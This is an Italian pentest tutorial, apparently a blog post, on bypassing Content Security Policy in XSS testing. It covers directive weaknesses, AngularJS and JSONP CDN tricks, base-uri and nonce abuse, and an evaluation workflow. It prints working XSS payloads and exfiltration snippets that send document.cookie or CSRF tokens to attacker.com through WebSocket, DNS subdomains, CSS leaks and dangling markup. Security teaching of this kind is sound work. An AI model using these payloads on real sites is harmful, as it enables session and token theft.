---
title: 'CSP Bypass: come aggirare Content Security Policy nei test XSS'
slug: xss-csp-bypass
description: 'Guida pratica ai CSP bypass: unsafe-inline, nonce deboli, base-uri, object-src, JSONP, AngularJS, dangling markup e tecniche reali per aggirare Content Security Policy.'
image: /xss-csp-bypass.webp
draft: true
date: 2026-03-29T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - content-security-policy
---

**Content Security Policy (CSP)** è considerata la difesa più solida contro XSS. In teoria, una CSP ben configurata blocca l'esecuzione di JavaScript iniettato. In pratica, la maggior parte delle CSP reali è configurata in modo da rendere il bypass possibile — o addirittura semplice.

Questa guida copre l'analisi di CSP e le tecniche di bypass più efficaci usate nei pentest professionali.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)

***

## Come Funziona CSP

CSP è un header HTTP che dice al browser quali risorse può caricare ed eseguire. Il server invia:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.esempio.com
```

Il browser obbedisce: esegue solo script che provengono da `self` (stesso dominio) o da `cdn.esempio.com`. Tutto il resto viene bloccato.

**Direttive principali:**

| Direttiva     | Controlla                                          |
| ------------- | -------------------------------------------------- |
| `script-src`  | Da dove vengono caricati gli script                |
| `default-src` | Fallback per tutte le direttive non specificate    |
| `style-src`   | Fogli di stile                                     |
| `img-src`     | Immagini                                           |
| `connect-src` | Richieste fetch/XHR (importante per exfiltration!) |
| `frame-src`   | Iframe                                             |
| `object-src`  | Plugin, object tag                                 |
| `base-uri`    | Tag `<base>`                                       |
| `form-action` | Dove possono puntare i form                        |

***

## Analizzare una CSP: Prima Cosa da Fare

Appena trovi un XSS e CSP è presente, analizza l'header. Usa [CSP Evaluator di Google](https://csp-evaluator.withgoogle.com/) per avere una valutazione rapida automatica.

Cerca queste debolezze nell'ordine:

1. Presenza di `'unsafe-inline'`
2. Presenza di `'unsafe-eval'`
3. Wildcard `*` nelle source
4. CDN o domini con JSONP endpoint
5. Nonce o hash — e come vengono gestiti
6. Direttive mancanti (`object-src`, `base-uri`)
7. `connect-src` — blocca l'exfiltration?

***

## Bypass 1: `'unsafe-inline'` Presente

Se la CSP contiene `'unsafe-inline'` in `script-src`, qualsiasi script inline funziona:

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
```

Questa è la configurazione più comune nelle CSP reali — spessa mantenuta per "compatibilità" con codice legacy.

***

## Bypass 2: `'unsafe-eval'` Presente

```http
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

`unsafe-eval` permette `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function()`:

```javascript
// Se hai reflection in un contesto dove puoi chiamare queste funzioni
eval('alert(1)')
setTimeout('alert(1)', 0)
new Function('alert(1)')()
```

***

## Bypass 3: Wildcard nel Dominio

```http
Content-Security-Policy: script-src *.esempio.com
```

La wildcard permette **qualsiasi subdomain** di `esempio.com`. Se riesci a ottenere JS su un subdomain (anche tramite subdomain takeover), la CSP è bypassata.

```http
Content-Security-Policy: script-src https:
```

`https:` permette qualsiasi HTTPS domain. Puoi caricare script da qualsiasi sito HTTPS — incluso il tuo:

```javascript
<script src="https://attacker.com/xss.js"></script>
```

***

## Bypass 4: JSONP su CDN Whitelistato

Questo è il bypass più elegante e più comune. Molte applicazioni whitelistano CDN come:

* `ajax.googleapis.com`
* `cdn.jsdelivr.net`
* `unpkg.com`
* `cdnjs.cloudflare.com`
* `code.jquery.com`

Se uno di questi CDN ospita o ha ospitato un endpoint JSONP, puoi usarlo per eseguire codice arbitrario:

```javascript
// Se script-src include ajax.googleapis.com
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

AngularJS versioni vecchie (\< 1.6) permettono template injection che porta a XSS — e Google CDN le ospita ancora. Se la CSP include `ajax.googleapis.com`, Angular CSP bypass funziona.

**Trovare JSONP su CDN whitelisted:**

Usa [JSONBee](https://github.com/zigoo0/JSONBee) — lista di endpoint JSONP su CDN comuni.

***

## Bypass 5: `script-src` Manca, ma c'è `default-src`

```http
Content-Security-Policy: default-src 'self'
```

Se `script-src` non è esplicitamente definito, usa `default-src`. Niente di speciale qui — ma:

```http
Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline'
```

Se `object-src` non è definito, usa `default-src: 'self'`. Se non c'è nemmeno `object-src`:

```javascript
<object data=javascript:alert(1)>
```

Molte CSP dimenticano `object-src 'none'` — e i browser eseguono JavaScript nei plugin object/embed anche con CSP restrittiva.

***

## Bypass 6: `base-uri` Non Definito

```http
Content-Security-Policy: script-src 'nonce-abc123'
```

Se `base-uri` non è specificato, puoi modificare il base URL della pagina:

```html
<!-- Inietti questo -->
<base href="https://attacker.com/">
```

Ora tutti i path relativi nella pagina puntano al tuo dominio. Se la pagina carica `<script src="/js/app.js">`, ora carica `https://attacker.com/js/app.js`.

Funziona solo se sei in un stored XSS o puoi iniettare HTML prima del `<base>` originale.

***

## Bypass 7: Nonce — Se il Nonce è Prevedibile o Riusabile

```http
Content-Security-Policy: script-src 'nonce-abc123def456'
```

Un nonce è un valore casuale generato per ogni request. Se un tag `<script>` nella pagina usa quel nonce, viene eseguito. Script senza nonce vengono bloccati.

**Vulnerabilità comuni dei nonce:**

1. **Nonce statico** (non cambia tra request) — leggi il nonce dal sorgente e usalo:

```javascript
<script nonce="abc123def456">alert(1)</script>
```

1. **Nonce predicibile** — basato su timestamp, sequential ID, etc.
2. **Nonce leakato** — appare in header Referer o Location, esposto a terze parti
3. **Script già presente con nonce** — se c'è un `<script nonce="x">` che accetta input (es: `var config = JSON.parse('INPUT')`), esci dalla stringa e inietti codice nello stesso tag.

***

## Bypass 8: Dangling Markup per Esfiltrazione

Quando non puoi eseguire JavaScript ma puoi iniettare HTML, usa **dangling markup** per esfiltrare token CSRF o altri dati sensibili:

```html
<!-- Iniezione in una pagina con CSP che blocca script -->
<img src='https://attacker.com/steal?data=
```

Questo apre un tag `<img>` con src che punta al tuo server, ma il valore src non è chiuso. Il browser continua a parsare l'HTML come parte del valore src, includendo potenzialmente token CSRF che si trovano più avanti nella pagina, fino al prossimo carattere `'`.

Funziona su alcuni browser se la pagina ha altri valori sensibili nel DOM che seguono il punto di iniezione.

***

## Bypass dell'Exfiltration: `connect-src` Restrittivo

Se `connect-src 'self'` blocca le tue richieste fetch/XHR verso il server esterno:

### WebSocket (non sempre bloccato da connect-src)

```javascript
// Verifica: in alcuni browser vecchi, ws: non era incluso in connect-src
var ws = new WebSocket('wss://attacker.com/collect');
ws.onopen = function() { ws.send(document.cookie); };
```

### DNS Exfiltration

```javascript
// Subdominio = dati, il DNS query arriva al tuo server
new Image().src = 'https://' + btoa(document.cookie).replace(/=/g,'') + '.attacker.com/x';
```

### CSS Leak (solo exfiltration passiva)

```html
<!-- Se sei limitato a CSS injection, non JS -->
<style>
input[value^="a"] { background: url(https://attacker.com/leak?v=a) }
input[value^="b"] { background: url(https://attacker.com/leak?v=b) }
/* ... per ogni carattere possibile */
</style>
```

Funziona su form con valori pre-popolati (es: token CSRF in un input).

***

## CSP Evaluator Workflow

Durante un pentest, quando incontri una CSP:

```bash
# 1. Estrai l'header dalla response (con curl)
curl -I https://target.com | grep -i content-security-policy

# 2. Copia il valore e analizza su
#    https://csp-evaluator.withgoogle.com/

# 3. Identifica domini whitelistati
#    Cerca JSONP su quei domini con JSONBee

# 4. Cerca unsafe-inline, unsafe-eval, wildcard

# 5. Controlla direttive mancanti: object-src, base-uri, form-action
```

***

## CSP Bypass Cheat Sheet

| Configurazione CSP         | Bypass                         |
| -------------------------- | ------------------------------ |
| `'unsafe-inline'` presente | Script inline diretti          |
| `'unsafe-eval'` presente   | `eval()`, `setTimeout(str)`    |
| Wildcard `*` o `https:`    | Carica script da attacker.com  |
| CDN con AngularJS          | Angular template injection     |
| CDN con JSONP              | JSONP callback injection       |
| `object-src` mancante      | `<object data=javascript:...>` |
| `base-uri` mancante        | `<base href=//attacker.com>`   |
| Nonce statico              | Riusa il nonce                 |
| Solo HTML injection        | Dangling markup exfiltration   |
| `connect-src 'self'`       | DNS exfiltration               |

***

*Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*

Vuoi migliorare davvero le tue competenze offensive con un percorso **1:1**? Vai su [HackIta Formazione](https://hackita.it/servizi).\
Se invece vuoi testare la sicurezza della tua azienda con un assessment professionale, trovi tutto su [HackIta Servizi](https://hackita.it/servizi).\
Se questo contenuto ti è stato utile e vuoi supportare il progetto, puoi farlo su [HackIta Supporto](https://hackita.it/supporto).\
Per un approfondimento esterno utile anche lato difesa, vedi il [CSP Evaluator di Google](https://csp-evaluator.withgoogle.com/).
